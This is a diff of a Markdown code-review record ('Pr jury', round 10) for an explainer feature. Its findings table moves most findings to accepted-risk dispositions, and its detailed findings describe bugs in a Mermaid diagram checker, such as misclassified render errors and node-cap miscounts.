@@ -1,8 +1,8 @@
 ---
 gate: pr
 subject: 2026-11-08-explainer
-round: 9
-outcome: rerun
+round: 10
+outcome: human
 ---
 # Pr jury: 2026-11-08-explainer
 
@@ -10,36 +10,36 @@ outcome: rerun
 
 | ID | Severity | Kind | Cites | Lenses | Validation | Status | Disposition | Baseline, failed rounds |
 | --- | --- | --- | --- | --- | --- | --- | --- | --- |
-| J-1 | blocker | contradiction | AC-9, CT-3 | adversary, consistency | confirmed | open |  | new, 0 |
-| J-2 | blocker | gap | FR-7, AC-5 | adversary, conformance | confirmed | open |  | new, 0 |
-| J-3 | major | gap | AC-9, CT-1 | adversary | confirmed | open |  | new, 0 |
-| J-4 | minor | contradiction | CT-4 | adversary | grounded | open |  | new, 0 |
-| J-5 | major | gap | CT-2 | adversary | confirmed | open |  | new, 0 |
-| J-6 | major | risk | CT-4 | adversary | confirmed | open |  | new, 0 |
+| J-1 | blocker | contradiction | AC-9, CT-3 | adversary, consistency | confirmed | disposed | accepted-risk (human) | unchanged, 0 |
+| J-2 | blocker | gap | FR-7, AC-5 | adversary, conformance | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-3 | major | gap | AC-9, CT-1 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-4 | minor | contradiction | CT-4 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-5 | major | gap | CT-2 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-6 | major | risk | CT-4 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
 | J-7 | major | gap | CT-1 | adversary | merged | merged |  | new, 0 |
-| J-8 | minor | gap | AC-7 | adversary | grounded | open |  | new, 0 |
-| J-9 | minor | risk | AC-6 | adversary | grounded | open |  | new, 0 |
-| J-10 | major | gap | CT-5 | adversary | confirmed | open |  | new, 0 |
-| J-11 | major | gap | CT-5 | adversary, correctness | confirmed | open |  | new, 0 |
+| J-8 | minor | gap | AC-7 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-9 | minor | risk | AC-6 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-10 | major | gap | CT-5 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-11 | major | gap | CT-5 | adversary, correctness | confirmed | disposed | accepted-risk (human) | new, 0 |
 | J-12 | major | risk | CT-5 | adversary, correctness | merged | merged |  | new, 0 |
-| J-13 | minor | gap | CT-5 | adversary | grounded | open |  | new, 0 |
-| J-14 | minor | risk | CT-5 | adversary | grounded | open |  | new, 0 |
+| J-13 | minor | gap | CT-5 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-14 | minor | risk | CT-5 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
 | J-15 | major | gap | CT-9, AC-4 | adversary | merged | merged |  | new, 0 |
-| J-16 | minor | gap | CT-9 | adversary | grounded | open |  | new, 0 |
-| J-17 | major | risk | CT-11 | adversary | confirmed | open |  | new, 0 |
-| J-18 | blocker | risk | AC-1, AC-2, AC-30, AC-32 | adversary, conformance, correctness | confirmed | open |  | new, 0 |
-| J-19 | major | risk | CT-7 | adversary | confirmed | open |  | new, 0 |
-| J-20 | minor | gap | CT-7 | adversary | grounded | open |  | new, 0 |
-| J-21 | minor | inconsistency | FR-27, CT-6 | adversary | grounded | open |  | new, 0 |
-| J-22 | minor | gap | CT-6, CT-10 | adversary | grounded | open |  | new, 0 |
-| J-23 | major | risk | FR-27, AC-35, CT-6 | adversary | confirmed | open |  | new, 0 |
+| J-16 | minor | gap | CT-9 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-17 | major | risk | CT-11 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-18 | blocker | risk | AC-1, AC-2, AC-30, AC-32 | adversary, conformance, correctness | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-19 | major | risk | CT-7 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-20 | minor | gap | CT-7 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-21 | minor | inconsistency | FR-27, CT-6 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-22 | minor | gap | CT-6, CT-10 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-23 | major | risk | FR-27, AC-35, CT-6 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
 | J-24 | major | risk | AC-18, AC-19, AC-34, AC-35 | adversary | merged | merged |  | new, 0 |
-| J-25 | minor | gap | CT-6, CT-10 | adversary | grounded | open |  | new, 0 |
+| J-25 | minor | gap | CT-6, CT-10 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
 | J-26 | major | gap | AC-16, CT-12 | adversary | refuted | refuted |  | new, 0 |
-| J-27 | minor | gap | AC-16, UJ-2 | adversary | grounded | open |  | new, 0 |
-| J-28 | minor | risk | AC-17, AC-15 | adversary, correctness | grounded | open |  | new, 0 |
+| J-27 | minor | gap | AC-16, UJ-2 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-28 | minor | risk | AC-17, AC-15 | adversary, correctness | grounded | disposed | accepted-risk (system) | new, 0 |
 | J-29 | major | gap | AC-9 | conformance | refuted | refuted |  | new, 0 |
-| J-30 | minor | gap | AC-5 | conformance | grounded | open |  | new, 0 |
+| J-30 | minor | gap | AC-5 | conformance | grounded | disposed | accepted-risk (system) | new, 0 |
 | J-31 | blocker | gap | AC-1, AC-2, AC-3 | conformance | merged | merged |  | new, 0 |
 | J-32 | blocker | gap | AC-30, AC-32 | conformance | merged | merged |  | new, 0 |
 | J-33 | blocker | gap | AC-12, AC-13, AC-14 | conformance | merged | merged |  | new, 0 |
@@ -47,102 +47,119 @@ outcome: rerun
 | J-35 | blocker | gap | AC-16 | conformance | merged | merged |  | new, 0 |
 | J-36 | blocker | gap | AC-17 | conformance | merged | merged |  | new, 0 |
 | J-37 | blocker | gap | AC-34 | conformance | merged | merged |  | new, 0 |
-| J-38 | minor | contradiction | CT-2, FR-7 | consistency | grounded | open |  | new, 0 |
-| J-39 | minor | inconsistency | CT-2, FR-7 | consistency | grounded | open |  | new, 0 |
-| J-40 | minor | gap | CT-1, FR-6 | consistency | grounded | open |  | new, 0 |
-| J-41 | major | gap | CT-7, AC-31 | consistency | confirmed | open |  | new, 0 |
-| J-42 | major | contradiction | CT-4, AC-28, FR-21 | consistency, correctness | confirmed | open |  | new, 0 |
-| J-43 | minor | ambiguity | CT-4, FR-15, FR-19 | consistency | grounded | open |  | new, 0 |
-| J-44 | minor | inconsistency | CT-5, CT-11, CT-13, FR-21 | consistency | grounded | open |  | new, 0 |
-| J-45 | minor | contradiction | CT-5, CT-6 | correctness | grounded | open |  | new, 0 |
-| J-46 | minor | gap | CT-10, CT-5 | correctness | grounded | open |  | new, 0 |
-| J-47 | minor | gap | AC-24, CT-8 | correctness | grounded | open |  | new, 0 |
-| J-48 | blocker | contradiction | CT-5, CT-9, AC-23, FR-5, FR-17 | adversary, integration | confirmed | open |  | new, 0 |
-| J-49 | minor | inconsistency | CT-1, CT-5, CT-7 | integration | grounded | open |  | new, 0 |
-| J-50 | minor | inconsistency | CT-5, CT-11 | integration | grounded | open |  | new, 0 |
-| J-51 | minor | gap | CT-11 | adversary, integration | grounded | open |  | new, 0 |
-| J-52 | minor | scope | CT-11 | adversary, integration | grounded | open |  | new, 0 |
-| J-53 | blocker | gap | AC-1 | cli | confirmed | open |  | new, 0 |
-| J-54 | blocker | gap | AC-2 | cli | confirmed | open |  | new, 0 |
-| J-55 | blocker | gap | AC-3 | cli | confirmed | open |  | new, 0 |
+| J-38 | major | contradiction | CT-2, FR-7 | consistency | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-39 | minor | inconsistency | CT-2, FR-7 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-40 | minor | gap | CT-1, FR-6 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-41 | major | gap | CT-7, AC-31 | consistency | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-42 | major | contradiction | CT-4, AC-28, FR-21 | consistency, correctness | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-43 | minor | ambiguity | CT-4, FR-15, FR-19 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-44 | minor | inconsistency | CT-5, CT-11, CT-13, FR-21 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-45 | minor | contradiction | CT-5, CT-6 | correctness | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-46 | minor | gap | CT-10, CT-5 | correctness | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-47 | minor | gap | AC-24, CT-8 | correctness | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-48 | blocker | contradiction | CT-5, CT-9, AC-23, FR-5, FR-17 | adversary, integration | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-49 | minor | inconsistency | CT-1, CT-5, CT-7 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-50 | minor | inconsistency | CT-5, CT-11 | integration | grounded | fixed |  | absent, 0 |
+| J-51 | minor | gap | CT-11 | adversary, integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-52 | minor | scope | CT-11 | adversary, integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-53 | blocker | gap | AC-1 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-54 | blocker | gap | AC-2 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-55 | blocker | gap | AC-3 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
 | J-56 | blocker | gap | AC-5 | cli | confirmed | fixed |  | absent, 0 |
 | J-57 | blocker | gap | AC-9 | cli | confirmed | fixed |  | absent, 0 |
-| J-58 | blocker | gap | AC-12 | cli | confirmed | open |  | new, 0 |
-| J-59 | blocker | gap | AC-13 | cli | confirmed | open |  | new, 0 |
-| J-60 | blocker | gap | AC-14 | cli | confirmed | open |  | new, 0 |
-| J-61 | blocker | gap | AC-15 | cli | confirmed | open |  | new, 0 |
-| J-62 | blocker | gap | AC-16 | cli | confirmed | open |  | new, 0 |
-| J-63 | blocker | gap | AC-17 | cli | confirmed | open |  | new, 0 |
-| J-64 | blocker | gap | AC-18 | cli | confirmed | open |  | new, 0 |
-| J-65 | blocker | gap | AC-19 | cli | confirmed | open |  | new, 0 |
+| J-58 | blocker | gap | AC-12 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-59 | blocker | gap | AC-13 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-60 | blocker | gap | AC-14 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-61 | blocker | gap | AC-15 | cli | confirmed | fixed |  | absent, 0 |
+| J-62 | blocker | gap | AC-16 | cli | confirmed | fixed |  | absent, 0 |
+| J-63 | blocker | gap | AC-17 | cli | confirmed | fixed |  | absent, 0 |
+| J-64 | blocker | gap | AC-18 | cli | confirmed | fixed |  | absent, 0 |
+| J-65 | blocker | gap | AC-19 | cli | confirmed | fixed |  | absent, 0 |
 | J-66 | blocker | gap | AC-20 | cli | confirmed | fixed |  | absent, 0 |
-| J-67 | blocker | gap | AC-24 | cli | confirmed | open |  | new, 0 |
-| J-68 | blocker | gap | AC-25 | cli | confirmed | open |  | new, 0 |
-| J-69 | blocker | gap | AC-26 | cli | confirmed | open |  | new, 0 |
-| J-70 | blocker | gap | AC-27 | cli | confirmed | open |  | new, 0 |
-| J-71 | blocker | gap | AC-28 | cli | confirmed | open |  | new, 0 |
-| J-72 | blocker | gap | AC-30 | cli | confirmed | open |  | new, 0 |
-| J-73 | blocker | gap | AC-32 | cli | confirmed | open |  | new, 0 |
-| J-74 | blocker | gap | AC-34 | cli | confirmed | open |  | new, 0 |
-| J-75 | blocker | gap | AC-35 | cli | confirmed | open |  | new, 0 |
+| J-67 | blocker | gap | AC-24 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-68 | blocker | gap | AC-25 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-69 | blocker | gap | AC-26 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-70 | blocker | gap | AC-27 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-71 | blocker | gap | AC-28 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-72 | blocker | gap | AC-30 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-73 | blocker | gap | AC-32 | cli | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-74 | blocker | gap | AC-34 | cli | confirmed | fixed |  | absent, 0 |
+| J-75 | blocker | gap | AC-35 | cli | confirmed | fixed |  | absent, 0 |
 | J-76 | major | risk | FR-17 | adversary | refuted | refuted |  | new, 0 |
 | J-77 | major | risk | AC-33 | adversary | merged | merged |  | new, 0 |
-| J-78 | major | risk | CT-9 | adversary | confirmed | open |  | new, 0 |
+| J-78 | major | risk | CT-9 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
 | J-79 | blocker | gap | AC-18, AC-19, AC-35 | conformance | merged | merged |  | new, 0 |
 | J-80 | major | gap | AC-1, AC-2, AC-3, AC-12, AC-13, AC-14, AC-15, AC-16, AC-17, AC-30, AC-32 | conformance | merged | merged |  | new, 0 |
-| J-81 | minor | scope | FR-17 | conformance | grounded | open |  | new, 0 |
+| J-81 | minor | scope | FR-17 | conformance | grounded | disposed | accepted-risk (system) | new, 0 |
 | J-82 | minor | inconsistency | TC-5, CT-4 | consistency | ungrounded | dropped |  | new, 0 |
-| J-83 | minor | contradiction | CT-4, CT-1 | consistency | grounded | open |  | new, 0 |
-| J-84 | minor | inconsistency | CT-4 | consistency | grounded | open |  | new, 0 |
-| J-85 | major | contradiction | CT-5 | consistency | confirmed | open |  | new, 0 |
-| J-86 | minor | contradiction | CT-5 | consistency | grounded | open |  | new, 0 |
-| J-87 | minor | inconsistency | CT-5, CT-6, FR-14 | consistency | grounded | open |  | new, 0 |
-| J-88 | minor | inconsistency | CT-1, CT-5 | consistency | grounded | open |  | new, 0 |
+| J-83 | minor | contradiction | CT-4, CT-1 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-84 | minor | inconsistency | CT-4 | consistency | grounded | disposed | accepted-risk (system) | unchanged, 1 |
+| J-85 | major | contradiction | CT-5 | consistency | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-86 | minor | contradiction | CT-5 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-87 | minor | inconsistency | CT-5, CT-6, FR-14 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-88 | minor | inconsistency | CT-1, CT-5 | consistency, integration | grounded | disposed | accepted-risk (system) | unchanged, 1 |
 | J-89 | major | contradiction | AC-32, CT-11 (FR-25) | consistency | refuted | refuted |  | new, 0 |
-| J-90 | minor | inconsistency | CT-9 | consistency, correctness | grounded | open |  | new, 0 |
-| J-91 | minor | inconsistency | CT-9 | consistency | grounded | open |  | new, 0 |
-| J-92 | minor | inconsistency | CT-9 | consistency | grounded | open |  | new, 0 |
-| J-93 | minor | ambiguity | AC-24, CT-8 | consistency | grounded | open |  | new, 0 |
+| J-90 | minor | inconsistency | CT-9 | consistency, correctness | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-91 | minor | inconsistency | CT-9 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-92 | minor | inconsistency | CT-9 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-93 | minor | ambiguity | AC-24, CT-8 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
 | J-94 | major | inconsistency | AC-18, AC-19, AC-35 | consistency | refuted | refuted |  | new, 0 |
-| J-95 | minor | inconsistency | AC-34 | consistency | grounded | open |  | new, 0 |
-| J-96 | minor | risk | CT-12, AC-15 | consistency | grounded | open |  | new, 0 |
-| J-97 | minor | inconsistency | CT-4, FR-20 | correctness | grounded | open |  | new, 0 |
-| J-98 | major | contradiction | CT-3, CT-4 | consistency | confirmed | open |  | new, 0 |
-| J-99 | major | inconsistency | CT-2, AC-5 | consistency | confirmed | open |  | new, 0 |
-| J-100 | minor | inconsistency | CT-5, CT-6, CT-10 | consistency | grounded | open |  | new, 0 |
-| J-101 | minor | contradiction | CT-3, FR-11 | conformance | grounded | open |  | new, 0 |
-| J-102 | minor | scope | CT-10 | conformance | grounded | open |  | new, 0 |
-| J-103 | minor | gap | AC-5, FR-7, CT-4 | conformance | grounded | open |  | new, 0 |
-| J-104 | minor | inconsistency | CT-3, AC-9 | conformance | grounded | open |  | new, 0 |
-| J-105 | minor | scope | AC-11 | conformance | grounded | open |  | new, 0 |
-| J-106 | major | gap | AC-15, CT-12 | correctness | confirmed | open |  | new, 0 |
-| J-107 | minor | gap | AC-17, CT-12 | correctness | grounded | open |  | new, 0 |
-| J-108 | blocker | inconsistency | CT-9, CT-5, AC-4, AC-23 | integration | confirmed | open |  | new, 0 |
-| J-109 | minor | inconsistency | CT-10, CT-4, CT-11 | integration | grounded | open |  | new, 0 |
-| J-110 | minor | risk | CT-7, CT-5, CT-1 | integration | grounded | open |  | new, 0 |
+| J-95 | minor | inconsistency | AC-34 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-96 | minor | risk | CT-12, AC-15 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-97 | minor | inconsistency | CT-4, FR-20 | correctness | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-98 | major | contradiction | CT-3, CT-4 | consistency | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-99 | major | inconsistency | CT-2, AC-5 | consistency | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-100 | minor | inconsistency | CT-5, CT-6, CT-10 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-101 | minor | contradiction | CT-3, FR-11 | conformance | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-102 | minor | scope | CT-10 | conformance | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-103 | minor | gap | AC-5, FR-7, CT-4 | conformance | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-104 | minor | inconsistency | CT-3, AC-9 | conformance | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-105 | minor | scope | AC-11 | conformance | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-106 | major | gap | AC-15, CT-12 | correctness | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-107 | minor | gap | AC-17, CT-12 | correctness | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-108 | blocker | inconsistency | CT-9, CT-5, AC-4, AC-23 | integration | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-109 | minor | inconsistency | CT-10, CT-4, CT-11 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-110 | minor | risk | CT-7, CT-5, CT-1 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
 | J-111 | blocker | contradiction | CT-9, CT-5, FR-17, AC-23 | integration | merged | merged |  | new, 0 |
-| J-112 | minor | inconsistency | CT-10, CT-5 | integration | grounded | open |  | new, 0 |
-| J-113 | minor | inconsistency | CT-11 | integration | grounded | open |  | new, 0 |
-| J-114 | minor | scope | FR-1 | integration | grounded | open |  | new, 0 |
-| J-115 | major | risk | AC-1, AC-2, AC-3, AC-30, AC-32, AC-12, AC-13, AC-14 | adversary | confirmed | open |  | new, 0 |
-| J-116 | major | inconsistency | CT-9, AC-4 | adversary | confirmed | open |  | new, 0 |
-| J-117 | major | risk | CT-11, AC-30 | adversary | confirmed | open |  | new, 0 |
+| J-112 | minor | inconsistency | CT-10, CT-5 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-113 | minor | inconsistency | CT-11 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-114 | minor | scope | FR-1 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-115 | major | risk | AC-1, AC-2, AC-3, AC-30, AC-32, AC-12, AC-13, AC-14 | adversary, conformance | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-116 | major | inconsistency | CT-9, AC-4 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-117 | major | risk | CT-11, AC-30 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
 | J-118 | major | risk | AC-30, AC-32, AC-12, AC-14 | adversary | merged | merged |  | new, 0 |
-| J-119 | minor | scope | CT-11, CT-12, CT-13 | adversary | grounded | open |  | new, 0 |
+| J-119 | minor | scope | CT-11, CT-12, CT-13 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-120 | major | gap | AC-4, CT-5 | adversary | confirmed | disposed | accepted-risk (human) | new, 0 |
+| J-121 | major | gap | AC-5, FR-7, CT-2 | adversary | merged | merged |  | new, 0 |
+| J-122 | major | risk | AC-9, CT-3, CT-4 | adversary | refuted | refuted |  | new, 0 |
+| J-123 | minor | inconsistency | CT-5 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-124 | minor | contradiction | FR-27, AC-35, CT-6 | adversary | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-125 | major | gap | AC-12, AC-13, AC-14, AC-1, AC-2, AC-3, AC-30, AC-32 | conformance | merged | merged |  | new, 0 |
+| J-126 | major | contradiction | CT-2, AC-5 | consistency | merged | merged |  | new, 0 |
+| J-127 | minor | contradiction | CT-5, AC-33 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-128 | minor | inconsistency | CT-5, CT-6 | consistency | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-129 | major | gap | FR-8, FR-7, FR-6 | correctness | refuted | refuted |  | new, 0 |
+| J-130 | minor | inconsistency | CT-5, CT-6, FR-9, FR-26 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-131 | minor | inconsistency | CT-5, CT-11, FR-25 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
+| J-132 | minor | inconsistency | CT-10, CT-11 | integration | grounded | disposed | accepted-risk (system) | new, 0 |
 
 ### J-1 A diagram can hide its own parse error as "unreachable", and a sandbox failure is called a broken diagram
 - quote: "when it exits non-zero with `Parse error` in its output"
 - situation (adversary): `render` checks `any(m in both for m in COULD_NOT_RUN)` before it looks for `Parse error`. mermaid-cli prints the offending source text in a parse error. A diagram with a syntax error and a label or node containing `ENOTFOUND`, `npm ERR` or `ETIMEDOUT` therefore returns "unreachable". `check` treats that as no error, so a broken diagram passes. The opposite also happens. Any non-zero exit without a marker and without `Parse error` is returned as `broken: <first line>`. Examples are a puppeteer "No usable sandbox" error when running as root or in CI, an OOM kill, or an unknown renderer crash. CT-3 says these are "unreachable". The check then fails with `broken diagram: <title>` for a valid diagram, and the writer is told to fix a diagram that is fine.
 - situation (consistency): `render("flowchar TD", ...)` against a mermaid-cli that exits 1 with `UnknownDiagramError: No diagram type detected` (no `Parse error` text). CT-3 says `unreachable`. The code (`if r.returncode == 0 or any(m in both for m in COULD_NOT_RUN):`, then `return "broken: " + next((l for l in lines if "Parse error" in l), lines[0] if lines else "exit %d" % r.returncode)`) returns `broken`, and the diff's own test asserts `explain.render("flowchar TD", Path(d) / "o.svg").startswith("broken: UnknownDiagramError"), "typo"`. The approved CT-3 wording was not changed and no change request appears in the pack; the test was written to match the code.
+- situation (consistency): a block with the typo `flowchar TD` makes npx exit 1 with `UnknownDiagramError`. The code returns `broken: UnknownDiagramError...` and the check names that block. Under CT-3 it returns `unreachable`, so `nio check explainer` prints `render skipped: the renderer could not be fetched` and stops rendering (the `break` in the check and in finish). Every later block is then never checked and the check can pass with a broken diagram in it. The test in tests/test_explain.py (test_ac9_broken_block) asserts the code's behaviour, so the approved text and the tests disagree.
 - fix: test `Parse error` first (non-zero exit only), and make everything else "unreachable", as CT-3 says. Don't match the markers against output that can contain diagram text.
 - validation: confirmed: explain.py:84 tests the COULD_NOT_RUN markers against the whole output before `Parse error`, so diagram text can mask a parse error; and a non-zero exit with no marker returns `broken:` where CT-3 says "any other failure" is `unreachable`. test_ac9 asserts `broken: UnknownDiagramError`, which contradicts CT-3.
+- disposition: accepted-risk by human: Known: Mermaid node counting and CT-2/CT-3 wording lag the deliberate T-17/T-18/T-19 code; tracked in #127
 
 ### J-2 The 20-node cap is passed by syntax `nodes` does not recognise
 - quote: "a node being a distinct node ID in the diagram block"
 - situation (adversary): `nodes` only counts IDs that are `[A-Za-z_]\w*`, sit next to the arrows in `ARROW`, or stand alone on a line. Each of these gives a diagram of 21 or more nodes that counts 20 or fewer.
 - situation (conformance): the passing test_ac5_node_cap proves only the node count. It doesn't prove that `nio check explainer` fails naming a 21-node diagram. The test that does is test_ac5_node_cap_check at tests/test_explain.py:146, and it has no result in the evidence file.
+- situation (adversary): `nodes()` does `line.split(":")[0]` before it splits on arrows. A Mermaid class shorthand such as `A:::hot --> B:::hot --> C:::hot --> ...` therefore yields only `A`. A 40-node chain written that way counts as 1 node, `check explainer` exits 0, and the oversized diagram ships. Diagram types with no arrow endpoints (class diagrams `Animal <|-- Duck`, ER `A ||--o{ B`, mindmap, gantt) are also under-counted, because only `-->`-style arrows and `participant`/`state` lines are recognised. Nothing fails or warns, so the rule meant to keep diagrams readable silently stops applying.
 - fix: have `nodes` return "unknown" for diagram types it does not parse, and have the check say the cap was not checked. Alternatively, add `~~~`, numeric IDs and the other arrow forms, and match the skip words only as whole words.
 - validation: confirmed: `nodes` only counts IDs matching `[A-Za-z_]\w*` next to ARROW matches. A diagram with numeric IDs (`1 --> 2`) never passes the fullmatch, so it counts 0. The cap in FR-7 is bypassed with no note.
+- disposition: accepted-risk by human: Known: Mermaid node counting and CT-2/CT-3 wording lag the deliberate T-17/T-18/T-19 code; tracked in #127
 
 ### J-3 A mermaid block can fall outside `sections` and `check`, and nothing says so
 - quote: "Given a diagram block with a syntax error, when the check runs, then it fails naming that block as a broken diagram."
@@ -150,23 +167,27 @@ outcome: rerun
 - situation (adversary): a section holds a small first Mermaid block and then a second block with a syntax error or 60 nodes. `sections()` keeps only the first (`if cur["block"] is None:`). `check` therefore never counts nodes in the second block and never renders it, so no `broken diagram` appears. A first block fenced `Mermaid` or `mmd` instead of `mermaid` is also skipped silently (`s["fence"] == "mermaid"` is an exact match). The check passes and finish later renders or links only the first block, so the second never reaches the reader as a checked diagram.
 - fix: compare the first word of the fence case-insensitively. Look at every fenced block in a section. Report an unclosed fence as an error.
 - validation: confirmed: `sections` keeps only the first block, and `check` (line 130) and `finish` (line 241) compare the fence to `mermaid` exactly. An unclosed fence leaves `block` None, and `check` raises nothing outside the core sections.
+- disposition: accepted-risk by human: Known: Mermaid node counting and CT-2/CT-3 wording lag the deliberate T-17/T-18/T-19 code; tracked in #127
 
 ### J-4 The renderer is retried for every block after it is found unreachable
 - quote: "after which no further block is rendered"
 - situation (adversary): `check` calls `render` for each mermaid block and ignores "no node" and "unreachable". Offline, or with `npx -y` stuck fetching the package and Chromium, each block takes up to `TIMEOUT = 120` seconds. An explainer with N diagrams makes the check run about 120 x N seconds, and a hook or CI step looks hung. The ponytail comment says T-4 adds the skip, but this diff ships the loop without the stop and without the note.
 - fix: stop rendering after the first "no node" or "unreachable", and emit the `render skipped` note as CT-4 says.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-5 Circle and hexagon nodes are invisible to the node cap
 - quote: "Each `"…"`, `[…]`, `(…)`, `{…}` and `|…|`, delimiters included, is dropped first"
 - situation (adversary): a Calls diagram is drawn as `A((x)) --> B((y)) --> ...` with 40 circle nodes. `DROP`'s `\([^)]*\)` matches `((x)` and leaves `A)`. The `[A-Za-z_]\w*` fullmatch then fails on `A)`, and the same happens for `A{{x}}` (leaves `A}`). `nodes()` returns an empty set, so `too many nodes` never fires and `nio check explainer` exits 0. AC-5 and NFR-1 (at most 20 nodes) are defeated without any signal. The tests only use bare IDs and `A["…"]`.
 - fix: strip nested shapes, for example repeat `DROP.sub` until the line stops changing, or match balanced delimiters. Add a test with 21 `((x))` nodes.
 - validation: confirmed: DROP's `\([^)]*\)` turns `A((x))` into `A)`, which fails the ID fullmatch in `nodes`, so a diagram of circle or hexagon nodes counts 0 and the cap never fires.
+- disposition: accepted-risk by human: Known: Mermaid node counting and CT-2/CT-3 wording lag the deliberate T-17/T-18/T-19 code; tracked in #127
 
 ### J-6 A symlinked explainer.md silently skips every plan check
 - quote: "plan_mode = target in {p.parent.name} or p == (spec.path(root, p.parent.name).parent / "explainer.md").resolve()"
 - situation (adversary): `nio check explainer checkout-refunds` where `.nio/specs/checkout-refunds/explainer.md` is a symlink (for example to a shared file or a file in another folder). `p.resolve()` now points elsewhere, so `p.parent.name` is not the slug. `target in {p.parent.name}` is false, and the second clause compares against the resolved path of a different folder, so it is also false. The check runs as topic mode: no core-diagram, contract-ID, node-cap or walk-through errors. It exits 0 with "0 errors" for a plan explainer that fails every plan rule. A slug argument is plan mode by definition in CT-4 ("a slug (plan mode: `.nio/specs/<slug>/explainer.md`)").
 - fix: set `plan_mode = True` whenever the argument is a slug, and test the path form only for `.md` arguments. Resolve before comparing only for those.
 - validation: confirmed: explain.py:99 resolves `p` before line 104 compares `p.parent.name` to the slug. A symlinked explainer.md resolves to another folder, so a slug argument falls to topic mode, against CT-4 ("a slug (plan mode...)").
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-7 Only the first fenced block of a section is capped or rendered
 - quote: "`fence` is the language of the section's first fenced block"
@@ -178,17 +199,20 @@ outcome: rerun
 - quote: "labels = " ".join(re.findall(r'"[^"]*"|\[[^\]]*\]', cm["block"] or ""))"
